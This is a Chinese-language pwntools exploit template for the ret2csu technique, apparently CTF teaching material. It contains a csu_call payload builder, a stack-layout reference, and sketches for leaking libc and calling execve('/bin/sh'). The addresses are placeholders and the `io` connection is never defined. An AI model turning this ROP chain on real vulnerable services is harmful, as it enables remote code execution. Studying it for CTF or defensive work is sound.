
# 模板概览与入口

本模板提供了 `ret2csu` 攻击的 `pwntools` EXP 骨架。`ret2csu` 是一种在 x86-64 程序中几乎通用的 ROP 技术，它利用 `__libc_csu_init` 函数中的 gadgets，在缺少 `pop rdi; ret` 等理想传参工具的情况下，依然能够控制 `rdi`, `rsi`, `rdx` 三个寄存器，从而调用任意函数。

此模板适用于 64 位程序，当需要调用一个需要三个以内参数的函数（如 `write`, `execve`），但无法直接找到相应 `pop <reg>; ret` gadgets 的场景。

**核心入口代码片段**：

```python
from pwn import *

# --- 环境设置 ---
context.arch = 'amd64'
elf = ELF('./your_binary')

# --- 关键信息 ---
offset = 128  # 栈溢出偏移

# 在 __libc_csu_init 中找到两个关键 gadget 的地址
# 使用 GDB/IDA 或 objdump -d your_binary | grep "__libc_csu_init" -A 20
csu_front_gadget = 0x...  # mov rdx, r15; mov rsi, r14; mov edi, r13d; call [r12+rbx*8]
csu_end_gadget = 0x...    # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret

# 封装 csu 调用
def csu_call(func_addr, rdi, rsi, rdx, ret_addr):
    # csu_end_gadget 控制寄存器
    payload = p64(csu_end_gadget)
    payload += p64(0)          # rbx
    payload += p64(1)          # rbp, to pass cmp rbp, rbx
    payload += p64(func_addr)  # r12, a pointer to the function to call
    payload += p64(rdi)        # r13 -> rdi
    payload += p64(rsi)        # r14 -> rsi
    payload += p64(rdx)        # r15 -> rdx
    
    # csu_front_gadget 执行调用
    payload += p64(csu_front_gadget)
    
    # 填充 add rsp, 8 和 6 个 pop
    payload += b'A' * 8 * 7
    
    # ROP 链的下一个地址
    payload += p64(ret_addr)
    return payload

# --- 漏洞利用 ---
# 示例：使用 ret2csu 调用 write(1, some_addr, 8) 泄露地址
write_got = elf.got['write']
some_addr_to_leak = elf.got['read'] # 泄露 read@got
return_to_main = elf.symbols['main']

payload = b'A' * offset
payload += csu_call(write_got, 1, some_addr_to_leak, 8, return_to_main)

io.sendline(payload)
# ... 后续接收和处理泄露的数据 ...

io.interactive()
```

# 攻击关键点速查

- **重要钩子 (Key Hooks)**
  - `__libc_csu_init` 函数：包含两个关键的 gadget 序列，是 `ret2csu` 的核心。
    - **`csu_end_gadget`**: 通常位于函数尾部，是一个 `pop` 序列，用于从栈上加载值到 `rbx`, `rbp`, `r12`, `r13`, `r14`, `r15` 寄存器。这是控制参数的入口。
    - **`csu_front_gadget`**: 通常位于 `csu_end_gadget` 之前，是一系列 `mov` 指令和一个 `call`。它将 `r13`, `r14`, `r15` 的值赋给 `edi`, `rsi`, `rdx`，并调用 `[r12 + rbx*8]` 指向的函数。

- **关键结构体 (Key Structures)**
  - **`ret2csu` ROP 链**: 一个精确布局的栈上数据结构。
    1.  `[Padding]`: 填充物。
    2.  `[csu_end_gadget_addr]`: 第一个 gadget，用于加载后续所有值。
    3.  `[0x0 (for rbx)]`: `rbx` 必须为 0，以简化 `call` 目标地址的计算。
    4.  `[0x1 (for rbp)]`: `rbp` 必须为 1（或任何非 0 值，只要 `rbp == rbx + 1`），以通过 `cmp rbp, rbx` 检查。
    5.  `[func_addr_ptr (for r12)]`: 一个**指向**目标函数地址的指针。通常是函数的 `.got.plt` 条目地址。
    6.  `[arg1 (for r13 -> rdi)]`: 第一个参数。
    7.  `[arg2 (for r14 -> rsi)]`: 第二个参数。
    8.  `[arg3 (for r15 -> rdx)]`: 第三个参数。
    9.  `[csu_front_gadget_addr]`: 第二个 gadget，用于执行参数赋值和函数调用。
    10. `[Junk Padding * 7]`: 用于填充 `add rsp, 8` 和 6 个 `pop` 指令所消耗的栈空间。
    11. `[next_rop_addr]`: `ret2csu` 链执行完毕后，要返回的下一个地址（如 `main`）。

- **主要攻击面 (Main Attack Surfaces)**
  - 栈溢出：必须能够覆盖返回地址，并能布置上述复杂的 ROP 链。
  - 函数指针调用：`call qword ptr [r12+rbx*8]` 是最终执行任意函数的点。

# 迭代扩展思路

- **从骨架到稳定 EXP 的演进**
  1.  **自动化 Gadget 查找**: `csu_end_gadget` 和 `csu_front_gadget` 的地址通常是固定的偏移。可以通过 `objdump` 或 `pwntools` 的反汇编功能来自动化查找，而不是手动在 IDA/GDB 中寻找。
  2.  **封装为通用函数**: 将模板中的 `csu_call` 函数进一步完善，使其能够处理 PIE，自动加上基址，并集成到更复杂的 ROP 链中。
  3.  **用于泄露 libc**: `ret2csu` 是泄露 libc 基址的绝佳工具，因为它不依赖于 libc 中的 gadgets。最常见的用法是构造 `write(1, read_got, 8)`，将 `read` 函数的真实地址打印出来，从而计算 libc 基址。
      ```python
      # payload = b'A' * offset
      # payload += csu_call(elf.got['write'], 1, elf.got['read'], 8, elf.symbols['main'])
      ```
  4.  **直接调用 `execve`**: 如果能找到 `/bin/sh` 字符串（或能写入一个），`ret2csu` 可以直接用来构造 `execve("/bin/sh", 0, 0)` 的系统调用。这需要先通过 ROP 链将 `execve` 的系统调用号（59）放入 `rax`，然后用 `ret2csu` 控制 `rdi`, `rsi`, `rdx`，最后跳转到 `syscall; ret` gadget。
      ```python
      # rop = ROP(elf)
      # rop.raw(rop.find_gadget(['pop rax', 'ret'])[0])
      # rop.raw(59) # execve syscall number
      # rop.raw(csu_call_payload_for_execve)
      # rop.raw(rop.find_gadget(['syscall', 'ret'])[0])
      ```
  5.  **处理变体**: 不同编译器版本可能会对 `__libc_csu_init` 的结构进行微小调整（如 `pop` 序列的顺序）。如果标准模板不工作，务必使用 `objdump -d` 自行反汇编，确认 `pop` 的顺序和 `mov` 的源/目标寄存器，并相应地调整 payload 布局。
  6.  **结合其他技术**: `ret2csu` 可以作为大型 ROP 链中的一个环节。例如，先用 `ret2csu` 调用 `read` 写入更复杂的 ROP 链到 BSS 段，然后再用栈迁移技术跳转过去执行。
